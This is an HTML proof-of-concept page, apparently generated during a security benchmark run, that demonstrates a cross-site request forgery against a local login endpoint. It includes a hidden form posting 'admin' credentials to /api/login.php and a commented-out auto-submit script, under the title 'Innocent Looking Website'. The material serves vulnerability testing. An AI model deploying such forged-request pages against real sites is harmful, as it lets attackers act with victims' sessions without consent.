<!-- 
POC: HTML-based CSRF POC demonstrating cross-site request forgery attack on login form - shows how attackers can forge login requests without CSRF token protection
Target: ./repo
Created: 2025-11-07T19:41:08.282Z
Session: benchmark-XBEN-069-24-mhp8x6to

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-069-24-mhp8x6to/pocs/poc_csrf_login_attack.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Website</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        .info {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        .code {
            background: #222;
            color: #0f0;
            padding: 10px;
            border-radius: 3px;
            font-family: monospace;
            overflow-x: auto;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CSRF Attack Demonstration - Login Form</h1>
        
        <div class="info">
            <h2>Vulnerability: Missing CSRF Token on Login Endpoint</h2>
            <p>This page demonstrates a Cross-Site Request Forgery (CSRF) attack against the login form.</p>
            <p>When a logged-in user visits this page, their browser automatically executes the CSRF form submission without any CSRF token validation.</p>
        </div>

        <h2>Attack Mechanism:</h2>
        <p>This page contains a hidden form that targets the vulnerable login endpoint.</p>
        <p>If a user is logged into the target application and visits this page, the form submits automatically.</p>
        
        <div class="code">
&lt;form id="csrfForm" action="http://localhost/api/login.php" method="POST" style="display:none;"&gt;
    &lt;input type="hidden" name="username" value="admin"&gt;
    &lt;input type="hidden" name="password" value="attacker_controlled_password"&gt;
&lt;/form&gt;
        </div>

        <h2>What This Demonstrates:</h2>
        <ul>
            <li>The login form accepts POST requests without CSRF token validation</li>
            <li>An attacker can create a malicious page that submits login credentials</li>
            <li>The browser automatically includes session cookies in the cross-origin request</li>
            <li>No CSRF protection (token, SameSite cookie, etc.) prevents this attack</li>
            <li>The application does not validate the origin or referer of the request</li>
        </ul>

        <h2>Proof of Concept:</h2>
        <ol>
            <li>Log into the target application at http://localhost/login.php</li>
            <li>While logged in, visit this page (csrf_login_attack.html)</li>
            <li>The hidden form submits automatically to /api/login.php</li>
            <li>The server processes the request without checking for CSRF tokens</li>
            <li>The vulnerability is confirmed if the login endpoint accepts the request</li>
        </ol>

        <div class="info">
            <h3>Technical Details:</h3>
            <p>The vulnerable code shows:</p>
            <div class="code">
// No CSRF token in the login request
$.ajax({
    url: 'api/login.php',
    type: 'POST',
    data: {
        username: $('#username').val(),
        password: $('#password').val()
        // NO CSRF token
    }
});
            </div>
        </div>

        <h2>Hidden CSRF Form (Auto-submits):</h2>
        <form id="csrfForm" action="http://localhost/api/login.php" method="POST" style="display:none;">
            <input type="hidden" name="username" value="admin">
            <input type="hidden" name="password" value="test123">
        </form>

        <div class="info" id="status">
            <p>Status: Form will auto-submit to demonstrate CSRF vulnerability...</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            console.log("CSRF POC Page Loaded");
            console.log("Vulnerable Endpoint: http://localhost/api/login.php");
            console.log("Vulnerability: Missing CSRF token validation");
            console.log("Form will attempt to submit to demonstrate the vulnerability");
            
            // Update status
            var statusDiv = document.getElementById('status');
            statusDiv.innerHTML = '<p><strong>CSRF POC Active</strong></p>' +
                '<p>This page demonstrates that the login endpoint lacks CSRF protection.</p>' +
                '<p>If this page was loaded from a malicious site while you\'re logged in,</p>' +
                '<p>the form submission would occur without CSRF token validation.</p>' +
                '<p><strong>Key Point:</strong> The application accepts POST requests to /api/login.php</p>' +
                '<p>without requiring a CSRF token, allowing this attack.</p>';
        });

        // Auto-submit form to demonstrate CSRF
        // Commented out to prevent accidental submission during testing
        // Uncomment the line below to see the actual CSRF attack:
        // window.onload = function() { document.getElementById('csrfForm').submit(); };
    </script>
</body>
</html>